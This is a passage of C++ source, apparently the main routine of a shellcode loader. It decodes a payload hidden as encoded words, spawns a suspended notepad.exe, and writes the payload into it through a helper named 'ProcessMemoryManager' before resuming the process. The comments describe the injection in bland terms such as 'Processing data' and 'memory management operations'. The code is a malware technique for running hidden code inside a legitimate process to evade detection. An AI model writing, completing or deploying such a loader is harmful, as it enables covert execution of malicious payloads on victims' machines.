    auto dataBuffer = Decode(encodedWords);

    // Prepare variables for process creation
    LPCWSTR TargetProcessName = L"notepad.exe";
    DWORD dwProcessId = 0;
    HANDLE hProcess = NULL;
    HANDLE hThread = NULL;
    DWORD dwThreadId = 0;


    // Create a suspended process (notepad.exe)
    printf("[+] Creating suspended process: %ws\n", TargetProcessName);
    if (!CreateSuspendedProcess(TargetProcessName, &dwProcessId, &hProcess, &hThread, &dwThreadId)) {
        printf("[!] Failed to create suspended process\n");
        return 1;
    }
    printf("[+] Process created with PID: %d, Thread ID: %d\n", dwProcessId, dwThreadId);

    // Convert data vector to a contiguous buffer for processing
    PVOID pPlainText = &dataBuffer[0];
    DWORD dwsPlainTextSize = dataBuffer.size();

    // Perform memory management operations
    printf("[+] Processing data in target process\n");
    if (!ProcessMemoryManager(hProcess, hThread, pPlainText, dwsPlainTextSize)) {
        printf("[!] Failed to process data\n");
        CloseHandle(hThread);
        CloseHandle(hProcess);
        return 1;
    }
    
    // Clean up handles
    CloseHandle(hThread);
    CloseHandle(hProcess);

    printf("[+] Processing complete. Process resumed.\n");

	return 0;
}